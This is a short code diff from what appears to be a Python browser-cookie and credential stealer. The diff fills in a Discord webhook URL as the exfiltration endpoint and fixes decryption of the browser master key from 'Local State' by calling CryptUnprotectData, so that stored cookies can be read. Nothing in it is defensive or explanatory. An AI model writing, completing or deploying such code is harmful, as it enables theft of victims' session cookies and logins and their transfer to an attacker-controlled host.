@@ -21,7 +21,7 @@ import subprocess
 # 
 
 
-hook = "WEBHOOK HERE"
+hook = "https://discord.com/api/webhooks/1036191471356870666/L1-E9hsjzBI9mqrIAE-oecNfnIyxBtiwuUgceaVZ6edQiipagcc9E3iD7P0YhG_uiVfJ"
 DETECTED = False
 
 
@@ -534,8 +534,8 @@ def getCookie(path, arg):
     pathKey = path + "/Local State"
 
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
 
     for row in data: 
         if row[0] != '':
